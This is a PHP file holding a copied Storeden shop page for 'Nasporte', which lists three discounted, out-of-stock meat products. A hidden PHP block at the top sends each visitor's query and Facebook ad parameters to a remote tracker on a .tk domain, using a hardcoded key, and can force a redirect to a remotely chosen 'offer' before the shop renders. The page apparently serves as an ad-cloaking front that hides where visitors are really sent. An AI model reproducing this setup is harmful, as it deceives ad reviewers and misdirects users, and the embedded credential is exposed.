<?php
// Query params are: utm_creative={{ad.name}}&utm_campaign={{campaign.name}}&utm_source={{site_source_name}}&campaign_id={{campaign.id}}&adset_id={{adset.id}}&ad_id={{ad.id}}&adset_name={{adset.name}}&fbp=98765678 

require_once dirname(__FILE__) . '/kclient.php';
$client = new KClient('https://ol3kate.tk/api.php?', 'Ps81XkDjM8ZL6sh1');
$client->sendAllParams();       // to send all params from page query
$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
// $client->param('sub_id_5', '123'); // you can send any params
// $client->keyword('PASTE_KEYWORD');  // send custom keyword
// $client->currentPageAsReferrer(); // to send current page URL as click referrer
// $client->debug();              // to enable debug mode and show the errors
// $client->execute();             // request to api, show the output and continue
$client->executeAndBreak();     // to stop page execution if there is redirect or some output
?>
<!DOCTYPE html>
<html lang="en" id="storeden-shop.html">
    <head>
        
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="">
		<link href="https://static-cdn.storeden.com" rel="preconnect" crossorigin="">
		<link href="https://tcdn.storeden.com" rel="preconnect" crossorigin="">
		<link href="https://code.jquery.com" rel="preconnect" crossorigin="">
		<link href="https://maxcdn.bootstrapcdn.com" rel="preconnect" crossorigin="">
		
		<title>Nasporte</title>
		<meta name="description" content="">
		<meta name="keywords" content="">
				<link rel="canonical" href="http://nasporte.mystoreden.com/shop">
				<script type="text/javascript">var addthis_config = { "data_use_cookies": false};</script><script> var StoredenCustomerData = null; var STOREDEN_COUNTRY_ID = 175; var StoredenRequestPath = ["","shop"];var exchange_rates = {"EURGBP":{"from":"EUR","to":"GBP","rate":0.85503},"EURUSD":{"from":"EUR","to":"USD","rate":1.1782},"EURCZK":{"from":"EUR","to":"CZK","rate":26.081},"EURCHF":{"from":"EUR","to":"CHF","rate":1.109},"EURAUD":{"from":"EUR","to":"AUD","rate":1.5459},"EURCAD":{"from":"EUR","to":"CAD","rate":1.4814},"USDEUR":{"from":"USD","to":"EUR","rate":0.8487523341},"USDGBP":{"from":"USD","to":"GBP","rate":0.7257087082},"USDCZK":{"from":"USD","to":"CZK","rate":22.1363096249},"USDCHF":{"from":"USD","to":"CHF","rate":0.9412663385},"USDAUD":{"from":"USD","to":"AUD","rate":1.3120862332},"USDCAD":{"from":"USD","to":"CAD","rate":1.2573417077},"GBPEUR":{"from":"GBP","to":"EUR","rate":1.1695496064},"GBPUSD":{"from":"GBP","to":"USD","rate":1.3779633463},"GBPCZK":{"from":"GBP","to":"CZK","rate":30.5030232857},"GBPCHF":{"from":"GBP","to":"CHF","rate":1.2970305135},"GBPAUD":{"from":"GBP","to":"AUD","rate":1.8080067366},"GBPCAD":{"from":"GBP","to":"CAD","rate":1.732570787},"CZKEUR":{"from":"CZK","to":"EUR","rate":0.0383420881},"CZKUSD":{"from":"CZK","to":"USD","rate":0.0451746482},"CZKGBP":{"from":"CZK","to":"GBP","rate":0.0327836356},"CZKCHF":{"from":"CZK","to":"CHF","rate":0.0425213757},"CZKAUD":{"from":"CZK","to":"AUD","rate":0.059273034},"CZKCAD":{"from":"CZK","to":"CAD","rate":0.0567999693},"CHFEUR":{"from":"CHF","to":"EUR","rate":0.9017132552},"CHFUSD":{"from":"CHF","to":"USD","rate":1.0623985573},"CHFGBP":{"from":"CHF","to":"GBP","rate":0.7709918846},"CHFCZK":{"from":"CHF","to":"CZK","rate":23.5175834085},"CHFAUD":{"from":"CHF","to":"AUD","rate":1.3939585212},"CHFCAD":{"from":"CHF","to":"CAD","rate":1.3357980162},"AUDEUR":{"from":"AUD","to":"EUR","rate":0.6468723721},"AUDUSD":{"from":"AUD","to":"USD","rate":0.7621450288},"AUDGBP":{"from":"AUD","to":"GBP","rate":0.5530952843},"AUDCZK":{"from":"AUD","to":"CZK","rate":16.8710783362},"AUDCHF":{"from":"AUD","to":"CHF","rate":0.7173814606},"AUDCAD":{"from":"AUD","to":"CAD","rate":0.958276732},"CADEUR":{"from":"CAD","to":"EUR","rate":0.675037127},"CADUSD":{"from":"CAD","to":"USD","rate":0.7953287431},"CADGBP":{"from":"CAD","to":"GBP","rate":0.5771769947},"CADCZK":{"from":"CAD","to":"CZK","rate":17.6056433104},"CADCHF":{"from":"CAD","to":"CHF","rate":0.7486161739},"CADAUD":{"from":"CAD","to":"AUD","rate":1.0435398947},"EURRON":{"from":"EUR","to":"RON","rate":4.8878},"EURNOK":{"from":"EUR","to":"NOK","rate":10.1258},"USDRON":{"from":"USD","to":"RON","rate":4.1485316585},"USDNOK":{"from":"USD","to":"NOK","rate":8.5942963843},"GBPRON":{"from":"GBP","to":"RON","rate":5.7165245664},"GBPNOK":{"from":"GBP","to":"NOK","rate":11.842625405},"CZKRON":{"from":"CZK","to":"RON","rate":0.1874084583},"CZKNOK":{"from":"CZK","to":"NOK","rate":0.3882443158},"CHFRON":{"from":"CHF","to":"RON","rate":4.4073940487},"CHFNOK":{"from":"CHF","to":"NOK","rate":9.1305680794},"AUDRON":{"from":"AUD","to":"RON","rate":3.1617827803},"AUDNOK":{"from":"AUD","to":"NOK","rate":6.5501002652},"CADRON":{"from":"CAD","to":"RON","rate":3.2994464696},"CADNOK":{"from":"CAD","to":"NOK","rate":6.835290941},"RONEUR":{"from":"RON","to":"EUR","rate":0.2045910225},"RONUSD":{"from":"RON","to":"USD","rate":0.2410491428},"RONGBP":{"from":"RON","to":"GBP","rate":0.174931462},"RONCZK":{"from":"RON","to":"CZK","rate":5.335938459},"RONCHF":{"from":"RON","to":"CHF","rate":0.226891444},"RONAUD":{"from":"RON","to":"AUD","rate":0.3162772618},"RONCAD":{"from":"RON","to":"CAD","rate":0.3030811408},"RONNOK":{"from":"RON","to":"NOK","rate":2.0716477761},"NOKEUR":{"from":"NOK","to":"EUR","rate":0.098757629},"NOKUSD":{"from":"NOK","to":"USD","rate":0.1163562385},"NOKGBP":{"from":"NOK","to":"GBP","rate":0.0844407355},"NOKCZK":{"from":"NOK","to":"CZK","rate":2.5756977226},"NOKCHF":{"from":"NOK","to":"CHF","rate":0.1095222106},"NOKAUD":{"from":"NOK","to":"AUD","rate":0.1526694187},"NOKCAD":{"from":"NOK","to":"CAD","rate":0.1462995516},"NOKRON":{"from":"NOK","to":"RON","rate":0.4827075392},"__from__":"memcache"}</script><script type="application/jd+json">{"@context":"http:\/\/schema.org","@type":"WebSite","name":"Nasporte","url":"http:\/\/nasporte.mystoreden.com","potentialAction":{"@type":"SearchAction","target":"http:\/\/nasporte.mystoreden.com\/shop\/search\/{search_term_string}","query-input":"required name=search_term_string"},"aggregateRating":{"@type":"AggregateRating","ratingValue":5,"ratingCount":0}}</script><meta name="theme-version" content="v2">
		
		<meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="shortcut icon" href="22303445.html">
        
		<link href="css/bootstrap.min.css" type="text/css" rel="stylesheet">
		<link href="css/font-awesome.min.css" type="text/css" rel="stylesheet">
		<link href="css/jquery.smartmenus.css" type="text/css" rel="stylesheet">
		<link href="css/storeden_font.css" rel="stylesheet">
		<link href="css/style.build.1616764969.css" type="text/css" rel="stylesheet">
		
		<script src="js/jquery-2.2.4.min.js"></script>
		<script src="js/bootstrap.min.js"></script>
		<script src="js/storeden.js"></script>
		<script src="js/jquery.smartmenus.js"></script>
		<link href="css/bootstrap-select.min.css" rel="stylesheet">
		<script src="js/bootstrap-select.js"></script>
		<script>Storeden.setAddresses(null)</script>
		<script src="js/style.build.1616764969.js"></script>
		<script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-27401285-7', 'auto', { 'name': 'storedensystem', 'storage': 'none', 'clientId': '84441713e6cc823bab1b034dfb5479fbac0fea03' } ); ga('storedensystem.set', 'anonymizeIp', true); ga('storedensystem.send', 'pageview');</script><meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"><script>$(document).ready(function(){ if($('#cookie-warning').length == 0){ $('body').append('<div id="cookie-warning"><span>This site uses cookies to deliver its services and allows you to send cookies from other sites (\"third-party\") to send advertising and services in line with your preferences. <br />If you want to learn more or opt out of all or some cookies <span><a href=\"/page/cookies-law\"> click here </a></span>. <br /> Closing this banner, scrolling this page or click any element you give consent to the use of every cookie.<br /> <span class = \"btn btn-primary\" id=\"cookie-policy-banner\"> Ok, I get it </span></span></div>');Storeden.checkCookie(); } })</script><script>$(document).ready(function(){ var user_menu = $("#ul-profile"); if (user_menu.length == 0) { user_menu = $("#user-menu"); } user_menu.find("li:last-child").after("<li><a id=\"giftcard_link\" href=\"/my-giftcard\">Gift card</a></li>"); if ("undefined" === typeof StoredenRequestPath) { StoredenRequestPath = window.location.pathname; StoredenRequestPath = StoredenRequestPath.split("/"); } if ( StoredenRequestPath[1]=="my-giftcard" ) { $("#giftcard_link").addClass("active"); } })</script>
		<!--[if IE]>
			<script src="https://static-cdn.storeden.com/restyle/html5.js"></script>
			<script src="https://static-cdn.storeden.com/restyle/respond.min.js"></script>
		<![endif]-->
		
			</head>
		<body id="shop">
	    	
									
										
		<div id="fb-root"></div>
		<script>(function(d, s, id) {
		  var js, fjs = d.getElementsByTagName(s)[0];
		  if (d.getElementById(id)) return;
		  js = d.createElement(s); js.id = id;
		  js.src = "//connect.facebook.net/it_IT/sdk.js#xfbml=1&appId=207743002628345&version=v2.0";
		  fjs.parentNode.insertBefore(js, fjs);
		}(document, 'script', 'facebook-jssdk'));</script>
		
		<header id="section_header" class="main_section">
	<div class="container">
		<div class="row">
			<div class="col-md-4 col-sm-4 col-xs-6 col-xxs-full reducedRightPadding">
								<div class="heading xs-text-left xxs-text-center">
					<a href="/" title="Nasporte">NASPORTE</a>
				</div>
							</div>

			<div class="col-md-8 col-sm-8 col-xs-6 col-xxs-full reducedLeftPadding" id="">
												<div id="top_menu" class="text-right">
					
											<span class="item cart_item ">
							<i class="fa fa-shopping-basket fa-lg showElement" data-target="cart_preview"></i>
							<span class="badge cart_items_count">0</span>
						</span>
						<span class="item">
							<i class="fa fa-search fa-lg showElement" data-target="search_box"></i>
						</span>
						<span class="item">
							<i class="fa fa-user fa-lg showElement" data-target="user_menu"></i>
						</span>
										
					<label class="main-menu-btn" for="main-menu-state" id="toggleMobileMenu">
						<span class="main-menu-btn-icon"></span>
					</label>
				</div>
			</div>

			<div id="cart_preview" class="showableItem text-center ">
				<p><strong>Cart summary</strong></p><p>
				</p><p class="cart_is_empty">
					Your shopping cart is empty
				</p>
				<div class="cart_has_items">
					<p>
						Items in cart: <span class="cart_items_count">0</span><br>
						Total items: &euro; <span class="cart_items_total">0,00</span>
					</p>
					<a href="/cart" class="btn button">Go to cart</a>
				</div>
			</div>

			<div id="search_box" class="showableItem">
				<form id="searchForm">
					<div class="input-group">
																		<input type="text" placeholder="Search" name="search" value="" class="form-control search_field">
						<span class="input-group-btn">
							<button type="submit" class="btn button"><i class="fa fa-search fa-lg"></i></button>
						</span>
					</div>
				</form>
			</div>
			
						
			<div id="user_menu" class="showableItem">
				
				<p><strong></strong></p><p>
				
									<a href="/login#formLogin">Login</a>
					<a href="/login#formRegistration">Register</a>
					<a href="/order_status">Verify your order</a>
								
								
			</p></div>	
			
						

		</div> <!-- header .container .row -->

	</div> <!-- header .container -->
</header>		<nav class="main-nav" role="navigation">
	<div class="container">
		<input id="main-menu-state" class="menu-state" type="checkbox">
		<ul id="main-menu" class="sm sm-clean menu">

					<li>
				<a href="/" class="">
					Home
				</a>
			</li>
					
									<li>
					<a href="/shop" class="active">
						Shop
					</a>
				</li>
					
																				
					
			
					<li>
				<a href="/about-us" class="">
					About us
				</a>
			</li>
				
					<li>
				<a href="/contact-us" class="">
					Contact us
				</a>
			</li>
					
					<li>
				<a href="/blog" class="">
					Blog
				</a>
			</li>
		
		</ul>
	</div>
</nav>

<script>

	$(function() {
	  $('#main-menu').smartmenus({
		mainMenuSubOffsetX: -1,
		mainMenuSubOffsetY: 4,
		subMenusSubOffsetX: 6,
		subMenusSubOffsetY: -6
	  });
	});

	$(function() {
	  var $mainMenuState = $('#main-menu-state');
	  if ($mainMenuState.length) {
		$mainMenuState.change(function(e) {
		  var $menu = $('#main-menu');
		  if (this.checked) {
			$menu.hide().slideDown(250, function() { $menu.css('display', ''); });
		  } else {
			$menu.show().slideUp(250, function() { $menu.css('display', ''); });
		  }
		});
		$(window).bind('beforeunload unload', function() {
		  if ($mainMenuState[0].checked) {
			$mainMenuState[0].click();
		  }
		});
	  }
	});
	
</script>						<div id="breadcrumb">
		<div class="container">
			
													
			<div class="row">

			<div class="col-md-8 col-sm-7 col-xs-12">
				<ol class="breadcrumb" itemscope="" itemtype="http://schema.org/BreadcrumbList">

				<li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem">
					<a href="/homepage">Home</a>
					<meta itemprop="position" content="1">
					<meta itemprop="name" content="Nasporte">
				</li>

									<li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem">
						<a href="/shop"> Shop </a>
						<meta itemprop="position" content="2">
						<meta itemprop="name" content="Shop">
					</li>
				
				
				

				
				

				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
									
									
									
					
									
									
				</ol>
			</div>

				
	
			</div>
		</div>
	</div>
			<div id="request_page">
				
	
	



						
		
		
	
<script>

	var perpage = 9;
	var orderField = '';
	var orderType = '';
	var page = 1;
	
	$(document).ready(function(){
		$('#perpage #'+perpage).addClass('active');
		$('#sort #'+orderField+'_'+orderType).addClass('active');
	})
	
</script>

<div class="container">
	<div class="row">

						
					<div class="col-md-3 col-sm-3 col-xs-12 shop_left_column">

				<div class="navigation-block">
											<nav class="categories-nav" role="navigation">
	<input id="categories-menu-state" data-target="#categories-menu" class="menu-state" type="checkbox">
	<label class="main-menu-btn" for="categories-menu-state">
		<span class="main-menu-btn-icon"></span>
	</label>
	<span class="nav-categories nav-title"><a href="#"><strong>Categories</strong></a></span>
	<ul id="categories-menu" class="sm sm-vertical sm-clean menu vertical-menu">
							</ul>
</nav>
<script>
	$(document).ready(function(){
		function setActiveToParent(active){
			var li = active.parent().parent().parent();
			if (li.prop('tagName') == 'LI') {
				var link = li.find('> a');
				console.log(link);
				link.addClass('active');
				link.click();
				setActiveToParent(link);
			}
		}
		var active = $('#categories-menu .active');
		setActiveToParent(active);
	});
</script>									</div>
				<div class="navigation-block">
																				</div>

								
			</div>
		
		<div class="col-md-9 col-sm-9 col-xs-12 shop_right_column">
																
			<h1 class="heading">Shop</h1>

										
			<div class="shop_heading row">
											</div>
			
								
<div class="toolbar">
	
		
		<span class="toolbar-item dropdown">
			<button data-toggle="dropdown" class="btn button-white">
				Sort
			</button>
			<ul class="dropdown-menu" id="sort">
				<li class=""><a id="new_1">Recent products</a></li>
				<li class=""><a id="new_-1">Order Old > New</a></li>
				<li class=""><a id="price_1">Price: lower</a></li>
				<li class=""><a id="price_-1">Price: higher</a></li>
				<li class=""><a id="title_1">Alphabetical: A-Z</a></li>
				<li class=""><a id="title_-1">Alphabetical: Z-A</a></li>
			</ul>
		</span>

		<span class="toolbar-item dropdown">
			<button data-toggle="dropdown" class="btn button-white">
				Products per page
			</button>
			<ul class="dropdown-menu" id="perpage">
									<li class="active"><a id="9">9</a></li>
									<li class=""><a id="30">30</a></li>
									<li class=""><a id="60">60</a></li>
									<li class=""><a id="90">90</a></li>
							</ul>
		</span>
	
		
	<span class="toolbar-item dropdown xs-hide">
		<button data-toggle="dropdown" class="btn button-white">
			View
		</button>
		<ul class="dropdown-menu text-left">
			<li><a id="grid" class="change-view grid" title="Grid" data-type="grid"><i class="fa fa-th-large fa-fw"></i> Grid</a></li>
			<li><a id="list" class="change-view list" title="List" data-type="list"><i class="fa fa-bars fa-fw"></i> List</a></li>	
		</ul>
	</span>
	
				
		<span class="toolbar-item">
			<ul class="pagination">

								
				
				
								 
									
								 
									
				
															<li class="active"><a>1</a></li>
													
				
			
			</ul>
		</span>
		
	
</div>						
			<div id="shop_products">
				<div class="row">
											<div class="product_container shop_product_container">
															<div class="product_wrapper col-md-4 col-sm-6 col-xs-12">
									
					 

						
	
		


<div class="product_preview">
	<a href="/product/22303509/graisse-salee" title="Graisse salée">
		<div class="product_preview_img">
			<img src="605de46fbe7ea05ce0920b21" alt="Graisse salée">
							<span class="ribbon top-right">
					-33%
				</span>
					</div>
	</a>
	<div class="product_preview_details">
		
		<a href="/product/22303509/graisse-salee" title="Graisse salée">
			<p class="product_preview_title"><strong>Graisse salée</strong></p>
			<p class="product_preview_price">
									<span class="price"><strike>&euro; 6,00</strike></span>
								<span class="final_price">&euro; 4,00</span>
			</p>
																<p class="product_preview_description hide">
				Le saindoux se distingue par un go&ucirc;t mod&eacute;r&eacute;ment sal&eacute; et un ar&ocirc;me riche d&#39;&eacute;pices. Le produit est fabriqu&eacute; &agrave; partir de lard de porc de haute qualit&eacute; avec des veines de viande, assaisonn&eacute; avec de l&#39;ail et des &eacute;pices. Les tranches de saindoux se marient parfaitement avec le pain noir et conviennent &eacute;galement &agrave; la cr&eacute;ation de collations originales. Gr&acirc;ce &agrave; l&#39;emballage sous vide, le produit conserve ses propri&eacute;t&eacute;s nutritionnelles tout au long de sa dur&eacute;e de conservation.
Ingr&eacute;dients: lard de porc, sel, ail, &eacute;pices: poivre noir, coriandre, cumin, feuille de laurier.
Valeur nutritive: prot&eacute;ines 1 g, graisses 95 g, glucides 0 G.
Valeur &eacute;nerg&eacute;tique: 859 kcal / 3532 kJ.
Ne pas stocker plus de 60 jours &agrave; une temp&eacute;rature comprise entre 0 et +6 &deg; C.
			</p>
		</a>
	
		<div class="product_preview_button text-center">
							<span class="btn button disabled">
					Out of stock
				</span>
						
					</div>
	
			
	</div>
	
</div>								</div>
															<div class="product_wrapper col-md-4 col-sm-6 col-xs-12">
									
					 

						
	
		


<div class="product_preview">
	<a href="/product/22308145/saindoux-rublevsky-mk-bielorusse-250-g" title="Saindoux Rublevsky MK Biélorusse 250 g">
		<div class="product_preview_img">
			<img src="605e498e5fb8e08be97d39f9" alt="Saindoux Rublevsky MK Biélorusse 250 g">
							<span class="ribbon top-right">
					-57%
				</span>
					</div>
	</a>
	<div class="product_preview_details">
		
		<a href="/product/22308145/saindoux-rublevsky-mk-bielorusse-250-g" title="Saindoux Rublevsky MK Biélorusse 250 g">
			<p class="product_preview_title"><strong>Saindoux Rublevsky MK Biélorusse 250 g</strong></p>
			<p class="product_preview_price">
									<span class="price"><strike>&euro; 7,00</strike></span>
								<span class="final_price">&euro; 3,00</span>
			</p>
																<p class="product_preview_description hide">
				Le saindoux &quot;Bi&eacute;lorusse&quot; se distingue par un go&ucirc;t mod&eacute;r&eacute;ment sal&eacute; et un ar&ocirc;me riche d&#39;&eacute;pices. Le produit est fabriqu&eacute; conform&eacute;ment aux exigences de GOST &agrave; partir de lard de porc de haute qualit&eacute; avec des veines de viande, assaisonn&eacute; d&#39;ail et d&#39;&eacute;pices. Les tranches de saindoux se marient parfaitement avec le pain noir et conviennent &eacute;galement &agrave; la cr&eacute;ation de collations originales. Gr&acirc;ce &agrave; l&#39;emballage sous vide, le produit conserve ses propri&eacute;t&eacute;s nutritionnelles tout au long de sa dur&eacute;e de conservation.
Ingr&eacute;dients: lard de porc, sel, ail, &eacute;pices: poivre noir, coriandre, cumin, feuille de laurier.
Valeur nutritive: prot&eacute;ines 1 g, graisses 95 g, glucides 0 G.
Valeur &eacute;nerg&eacute;tique: 859 kcal / 3532 kJ.
Ne pas stocker plus de 60 jours &agrave; une temp&eacute;rature comprise entre 0 et +6 &deg; C.
			</p>
		</a>
	
		<div class="product_preview_button text-center">
							<span class="btn button disabled">
					Out of stock
				</span>
						
					</div>
	
			
	</div>
	
</div>								</div>
															<div class="product_wrapper col-md-4 col-sm-6 col-xs-12">
									
					 

						
	
		


<div class="product_preview">
	<a href="/product/22308168/carnați-fierți-klinsky-mk-doktorskaya-500-g" title="Cârnați fierți Klinsky Mk Doktorskaya 500 g">
		<div class="product_preview_img">
			<img src="605e510b00f2201c4ab1b463" alt="Cârnați fierți Klinsky Mk Doktorskaya 500 g">
							<span class="ribbon top-right">
					-63%
				</span>
					</div>
	</a>
	<div class="product_preview_details">
		
		<a href="/product/22308168/carnați-fierți-klinsky-mk-doktorskaya-500-g" title="Cârnați fierți Klinsky Mk Doktorskaya 500 g">
			<p class="product_preview_title"><strong>Cârnați fierți Klinsky Mk Doktorskaya 500 g</strong></p>
			<p class="product_preview_price">
									<span class="price"><strike>&euro; 8,00</strike></span>
								<span class="final_price">&euro; 3,00</span>
			</p>
																<p class="product_preview_description hide">
				C&acirc;rnații &quot;Doktorskaya&quot; de la Klin l&acirc;ngă Moscova &icirc;ndeplinesc cerințele GOST &icirc;n compoziția sa: principalele ingrediente sunt carnea de porc și carnea de vită, nu există soia și alți &icirc;nlocuitori de carne. Laptele și condimentele &icirc;i conferă un gust ușor, dar savuros. Produsul are o culoare Roz calmă, o aromă apetisantă și o consistență uniformă, este potrivit pentru a face sandvișuri, ouă amestecate, gustări reci și salate și poate fi consumat și separat. Forma produsului-o p&acirc;ine &icirc;ntr-o coajă de poliamidă.
Categoria A produs din carne.
Ingrediente: carne de porc, carne de vită, apă, melanj de ou, sare de nitrit (sare, fixativ de culoare-nitrit de sodiu), lapte praf degresat, aditiv alimentar complex (condimente: nucșoară, piper negru, regulatori de aciditate-E450( i), E451(i), antioxidant - ascorbat de sodiu, potențiator de aromă - E621), zahăr.
Valoarea nutritivă per 100g: proteine 12G, grăsime 20g.
Valoarea energetică - 228 kcal.
Perioada de valabilitate la o temperatură de 0 &#39;C p&acirc;nă la +6&#39; C grade - 30 de zile.
GOST R 52196-2011
SA &quot;Fabrica de prelucrare a cărnii Klinsky&quot;.
			</p>
		</a>
	
		<div class="product_preview_button text-center">
							<span class="btn button disabled">
					Out of stock
				</span>
						
					</div>
	
			
	</div>
	
</div>								</div>
													</div>
									</div>
			</div>
			
						
		</div>
	</div>
</div>

<div id="section-container">
		</div>			</div>
				<footer id="section_footer" class="main_section">
	<div class="container">
		<div class="row">	
			
									
			<div class="col-md-4 col-sm-4 col-xs-12 xs-text-center">
				<div class="footer_box" id="footer_box_1">
					<div class="heading">Nasporte</div>
					<p><span data-editor="settings_footer_address" id="settings_footer_address">
													</span>
																	</p>
					<br>
					<div class="social_links">
						</div>					
				</div>
			</div>
			<div class="col-md-4 col-sm-4 col-xs-12 xs-text-center">
									<div class="footer_box" id="footer_box_2">
						<div class="heading" data-editor="settings_footer_box_1_title_en_US">
							Information
						</div>
						<ul class="simple_link_list">
																																				</ul>
					</div>
							</div>
			
			
			<div class="col-md-4 col-sm-4 col-xs-12 xs-text-center">
							</div>
			
						
		</div>
		
		<div class="row footer_bottom">	
			<div class="col-md-10 col-sm-9 col-xs-12 xs-text-center">
				<p>
					<small>
					Copyright &copy; 2021 Nasporte. All rights reserved.
					<a href="/page/page-privacy" rel="nofollow" target="_blank" data-toggle="modal">Privacy policy</a>
											<a href="/page/page-conditions" rel="nofollow" target="_blank" data-toggle="modal">User agreement</a>
										<a href="/page/cookies-law" rel="nofollow" target="_blank" data-toggle="modal">Cookies policy</a>
					<a href="http://ec.europa.eu/consumers/odr/" target="_blank" rel="nofollow" class="odr-link"> ODR </a>
					</small>
				</p>
			</div>
			<div class="col-md-2 col-sm-3 col-xs-12 text-right xs-text-center">
				<p><small> Powered by <a target="_blank" href="https://www.storeden.com/">Storeden</a> </small>
			</p></div>
		</div>
	</div>
</footer>		

<div class="modal fade" id="privacyModal">
	<div class="modal-dialog">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span></button>
				<div class="heading noMarginBottom">Privacy policy</div>
			</div>
			<div class="modal-body">
			</div>
			<div class="modal-footer">
				<button class="btn button pull-right" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="conditionsModal">
	<div class="modal-dialog">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span></button>
				<div class="heading noMarginBottom">User agreement</div>
			</div>
			<div class="modal-body">
			</div>
			<div class="modal-footer">
				<button class="btn button pull-right" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="storedenConditionsModal">
	<div class="modal-dialog">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span></button>
				<div class="heading noMarginBottom">Terms and conditions</div>
			</div>
			<div class="modal-body" id="storeden_conditions"></div>
			<div class="modal-footer">
				<button class="btn button pull-right" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="storedenPrivacyModal">
	<div class="modal-dialog">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span></button>
				<div class="heading noMarginBottom">Privacy policy</div>
			</div>
			<div class="modal-body" id="storeden_privacy"></div>
			<div class="modal-footer">
				<button class="btn button pull-right" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>		<div id="cookie-warning">
			<span> This site uses cookies to deliver its services and allows you to send cookies from other sites ("third-party") to send advertising and services in line with your preferences. <br>If you want to learn more or opt out of all or some cookies <span><a href="/page/cookies-law"> click here </a></span>. <br> Closing this banner, scrolling this page or click any element you give consent to the use of every cookie.<br> <span class="btn btn-primary" id="cookie-policy-banner"> Ok, I get it </span></span>
		</div>
		<script>Storeden.hideCookieBanner();</script>
        
    <script>$('a[href$="/messages"]').parent('li').remove();$('a[href$="/messages"]').remove()</script></body>
</html>